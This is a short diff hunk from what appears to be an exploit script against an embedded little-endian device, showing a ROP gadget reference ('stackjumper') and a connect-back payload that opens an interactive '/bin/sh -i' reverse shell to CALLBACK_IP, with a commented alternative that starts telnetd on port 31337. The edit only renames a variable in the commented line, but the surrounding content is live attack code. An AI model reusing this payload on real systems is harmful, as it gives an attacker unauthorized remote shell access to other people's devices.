@@ -69,7 +69,7 @@ SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")
 connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/bin/sh -i")
 
 #Or non-interactive exploitation:
-#connectback_server=ConnectbackServer(connectback_host,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)
+#connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)
 
 payload=ConnectbackPayload(CALLBACK_IP,LittleEndian)
 
